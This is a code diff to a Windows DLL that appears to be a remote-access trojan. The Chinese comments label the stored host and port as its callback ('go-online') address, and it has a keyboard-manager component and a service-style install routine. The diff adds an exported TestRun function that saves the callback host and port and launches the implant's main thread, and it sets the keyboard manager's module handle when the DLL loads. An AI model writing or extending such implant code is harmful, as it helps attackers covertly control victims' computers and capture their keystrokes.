@@ -156,6 +156,16 @@ DWORD WINAPI main(char *lpServiceName)
 	CloseHandle(hInstallMutex);
 }
 
+extern "C" __declspec(dllexport) void TestRun(char *strHost, int nPort)
+{
+	strcpy(g_strHost, strHost);  //保存上线地址
+	g_dwPort = nPort;             //保存上线端口
+	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
+	//这里等待线程结束
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+}
+
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
@@ -165,6 +175,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	{
 	case DLL_PROCESS_ATTACH:
 	case DLL_THREAD_ATTACH:
+		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
+		break;
 	case DLL_THREAD_DETACH:
 	case DLL_PROCESS_DETACH:
 		break;
